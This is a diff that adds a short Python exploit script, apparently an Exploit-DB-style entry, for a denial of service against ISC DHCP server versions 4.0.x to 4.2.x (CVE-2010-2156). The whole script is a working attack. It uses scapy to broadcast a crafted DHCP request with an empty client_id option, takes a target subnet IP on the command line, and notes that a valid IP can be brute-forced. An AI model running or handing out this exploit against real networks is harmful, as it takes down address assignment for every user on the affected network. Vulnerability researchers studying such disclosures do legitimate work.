@@ -1,0 +1,41 @@
+#! /usr/bin/env python
+# Exploit title: isc-dhcpd DoS
+# Date: 03/07/2010	
+# Author: sid
+# Software Link: https://www.isc.org/software/dhcp
+# Version:  4.0.x, 4.1.x, 4.2.x 
+# CVE: cve-2010-2156
+# ps: is possible make a bruteforce on subnet ip address to find a correct value. 
+# 
+
+
+import sys
+import string
+
+if len(sys.argv) is 1:
+	print("Usage: " + sys.argv[0] + "-ip=<legal ip in subnet>")
+	print("Example: " + sys.argv[0] + " -ip=192.168.1.100")
+	sys.exit(0)
+
+for i in range(len(sys.argv)):
+	if string.find(sys.argv[i],"-ip") is 0:
+		globals()['ip'] = sys.argv[i].split('=')[1]
+
+from scapy.all import *
+
+globals()['verbose'] = 2
+
+def msg(string, level):
+    if globals()['verbose'] >= level:
+        print(string)
+
+msg("attack...",2)
+p=(Ether(src="aa:aa:aa:aa:aa:aa",dst="ff:ff:ff:ff:ff:ff")/IP(dst="255.255.255.255")/UDP(sport=68,dport=67)/
+BOOTP(ciaddr=globals()['ip'],chaddr="\xaa\xaa\xaa\xaa\xaa\xaa")/
+DHCP(options=[("message-type","request"),("client_id",""),("end")]))
+
+if p:
+	p.show()
+sendp(p)
+
+#EOF
